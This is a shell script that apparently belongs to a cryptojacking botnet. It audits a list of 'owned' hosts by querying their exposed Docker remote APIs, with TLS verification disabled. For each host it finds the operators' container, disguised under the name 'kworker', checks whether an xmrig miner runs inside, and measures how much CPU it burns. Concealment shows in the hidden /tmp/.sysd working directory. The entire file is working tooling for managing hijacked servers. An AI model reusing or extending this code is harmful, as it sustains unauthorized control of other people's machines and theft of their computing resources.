#!/bin/sh
# ============================================================================
# yield audit - for every host we claim to own, decide whether it actually
# produces. "Owned" is not "producing": a canned API is owned and hashes zero,
# and a container that runs without xmrig inside it is owned and hashes zero too.
#
# The fleet average is ~45 H/s per owned host, while the /info census says six
# hosts have >=8 vCPU and twenty have 4-7. Those alone should be tens of kH/s.
# This audit is how we find out where that horsepower went.
#
# Emits TSV: ip  mock  ncpu  memMB  state  xproc  cpupct  note
#   mock   := mock | -                 (already flagged as a canned API)
#   state  := running | exited | created | gone | noapi | listfail | -
#   xproc  := yes | no | -             (an xmrig process inside the container)
#   cpupct := percent of ONE core that container is burning (0 = idle)
# Bounded: ~6 short curls per host, AUDIT_PAR at a time, setsid-safe.
# ============================================================================
SELF_DIR=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
SYSDIR="${SYSDIR:-/tmp/.sysd}"
WORK="${HUNT_WORK:-$SYSDIR/.hunt}"
[ -r "$SYSDIR/worker.env" ] && . "$SYSDIR/worker.env"
OUT="${AUDIT_OUT:-/tmp/_yaudit.out}"
PAR="${AUDIT_PAR:-8}"
MOCKFILE="$WORK/dock.mock"
: > "$OUT"

audit_one() {
    ip=$1
    if grep -qxF "$ip" "$MOCKFILE" 2>/dev/null; then mk=mock; else mk=-; fi

    # endpoint + the daemon's own api version (speak what it speaks, as dock.sh does)
    b=""; o=""; pv=""
    for p in 2375 2376 4243; do
        case $p in
            2376) hb="https://$ip:$p"; ho="-k" ;;
            *)    hb="http://$ip:$p";  ho=""  ;;
        esac
        v=$(curl -fsS $ho --max-time 4 "$hb/version" 2>/dev/null) || continue
        case "$v" in
            *ApiVersion*)
                pv=$(printf '%s' "$v" | grep -o '"ApiVersion": *"[0-9.]*"' | head -1 | cut -d'"' -f4)
                b="$hb"; o="$ho"; break ;;
        esac
    done
    if [ -z "$b" ]; then
        printf '%s\t%s\t-\t-\tnoapi\t-\t0\tno daemon answer\n' "$ip" "$mk" >> "$OUT"
        return 0
    fi
    bb="$b"; [ -n "$pv" ] && bb="$b/v$pv"

    inf=$(curl -fsS $o --max-time 5 "$bb/info" 2>/dev/null) || inf=""
    ncpu=$(printf '%s' "$inf" | grep -o '"NCPU":[0-9]*' | head -1 | cut -d: -f2)
    mem=$(printf '%s' "$inf" | grep -o '"MemTotal":[0-9]*' | head -1 | cut -d: -f2)
    [ -n "$mem" ] && mem=$((mem / 1048576))

    lst=$(curl -fsS $o --max-time 6 "$bb/containers/json?all=1" 2>/dev/null) || lst=""
    if [ -z "$lst" ] && [ "$bb" != "$b" ]; then
        lst=$(curl -fsS $o --max-time 6 "$b/containers/json?all=1" 2>/dev/null) || lst=""
    fi
    if [ -z "$lst" ]; then
        printf '%s\t%s\t%s\t%s\tlistfail\t-\t0\tlist call empty\n' \
            "$ip" "$mk" "${ncpu:--}" "${mem:--}" >> "$OUT"
        return 0
    fi
    # one object per line. Objects are separated by "},{", so split on THAT: the
    # obvious `tr '}' '\n'` puts Id in the fragment before "Ports" and Labels after
    # it, so the label line has no Id and every host looked like "gone".
    frag=$(printf '%s' "$lst" | sed 's/},{/}\n{/g' | grep -i 'kworker' | head -1)
    if [ -z "$frag" ]; then
        printf '%s\t%s\t%s\t%s\tgone\t-\t0\tno container of ours\n' \
            "$ip" "$mk" "${ncpu:--}" "${mem:--}" >> "$OUT"
        return 0
    fi
    fid=$(printf '%s' "$frag" | grep -o '"Id":"[0-9a-f]*"' | head -1 | cut -d'"' -f4)
    st=$(printf '%s' "$frag" | grep -o '"State":"[a-z]*"' | head -1 | cut -d'"' -f4)
    stat=$(printf '%s' "$frag" | grep -o '"Status":"[^"]*"' | head -1 | cut -d'"' -f4)

    if [ "$st" != running ]; then
        printf '%s\t%s\t%s\t%s\t%s\t-\t0\t%s\n' \
            "$ip" "$mk" "${ncpu:--}" "${mem:--}" "${st:-unknown}" \
            "$(printf '%s' "$stat" | head -c 48)" >> "$OUT"
        return 0
    fi

    # it claims to be running: is xmrig inside it, and is it burning cpu?
    tp=$(curl -fsS $o --max-time 6 "$bb/containers/$fid/top" 2>/dev/null) || tp=""
    if [ -z "$tp" ] && [ "$bb" != "$b" ]; then
        tp=$(curl -fsS $o --max-time 6 "$b/containers/$fid/top" 2>/dev/null) || tp=""
    fi
    case "$tp" in *xmrig*) xp=yes ;; *) xp=no ;; esac

    s1=$(curl -fsS $o --max-time 6 "$bb/containers/$fid/stats?stream=false" 2>/dev/null) || s1=""
    pct=0
    if [ -n "$s1" ]; then
        tot=$(printf '%s' "$s1" | grep -o '"total_usage":[0-9]*' | cut -d: -f2)
        sys=$(printf '%s' "$s1" | grep -o '"system_cpu_usage":[0-9]*' | cut -d: -f2)
        pre=$(printf '%s\n' "$tot" | sed -n 1p); cur=$(printf '%s\n' "$tot" | sed -n 2p)
        psys=$(printf '%s\n' "$sys" | sed -n 1p); csys=$(printf '%s\n' "$sys" | sed -n 2p)
        if [ -n "$cur" ] && [ -n "$csys" ] && [ "${csys:-0}" -gt "${psys:-0}" ] 2>/dev/null; then
            pct=$(awk -v d="$((cur - pre))" -v s="$((csys - psys))" -v c="${ncpu:-1}" \
                  'BEGIN { printf "%.1f", 100 * d / s * c }')
        fi
    fi
    printf '%s\t%s\t%s\t%s\trunning\t%s\t%s\t%s\n' \
        "$ip" "$mk" "${ncpu:--}" "${mem:--}" "$xp" "$pct" \
        "$(printf '%s' "$stat" | head -c 40)" >> "$OUT"
}

ips=$(cut -f1 "$WORK/dock.owned" 2>/dev/null | tr -d '\r' \
      | grep -E '^[0-9]{1,3}(\.[0-9]{1,3}){3}$' | sort -u)
n=0
for ip in $ips; do
    audit_one "$ip" &
    n=$((n + 1))
    [ $((n % PAR)) -eq 0 ] && wait || true
done
wait || true

echo "audit: $(grep -c . "$OUT") host(s) -> $OUT"
awk -F'\t' '{ c[$5]++ } END { for (k in c) printf "  state %-9s %s\n", k, c[k] }' "$OUT" | sort
echo "  -- producing (running + xmrig + cpu>=3% of a core) --"
awk -F'\t' '$5=="running" && $6=="yes" && $7+0 >= 3 { s += $7+0; printf "  ok   %-16s %2svcpu %6sMB cpu=%s%%\n", $1, $3, $4, $7 }
     END { printf "  ok total ~%s%% of one core\n", s+0 }' "$OUT"
echo "  -- running but idle (xmrig missing or ~0 cpu) --"
awk -F'\t' '$5=="running" && ($6=="no" || $7+0 < 3) { printf "  idle %-16s %2svcpu %6sMB xproc=%s cpu=%s%%  %s\n", $1, $3, $4, $6, $7, $8 }' "$OUT"
echo "  -- down / gone / broken --"
awk -F'\t' '$5!="running" { printf "  %-9s %-16s %2svcpu %6sMB %s  %s\n", $5, $1, $3, $4, ($2=="mock" ? "MOCKFLAG" : ""), $8 }' "$OUT" | sort
